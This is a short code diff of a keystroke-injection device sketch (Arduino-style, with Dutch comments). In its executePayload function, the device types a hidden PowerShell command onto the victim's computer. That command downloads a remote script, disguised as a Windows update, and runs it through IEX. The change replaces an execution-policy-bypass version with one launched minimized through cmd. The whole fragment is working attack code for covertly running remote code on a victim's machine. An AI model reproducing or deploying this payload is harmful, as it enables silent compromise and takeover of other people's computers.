@@ -36,7 +36,7 @@ void executePayload() {
   // Download en execute payload
   // Optie 2: Via hosted script (uncomment indien gewenst)
   
-  Keyboard.print("powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Windows-Update-Proxy/Updater/refs/heads/main/Windows/WindowsUpdate.ps1')");
+  Keyboard.print("cmd /c start /min powershell -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Windows-Update-Proxy/Updater/refs/heads/main/Windows/WindowsUpdate.ps1')");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
   
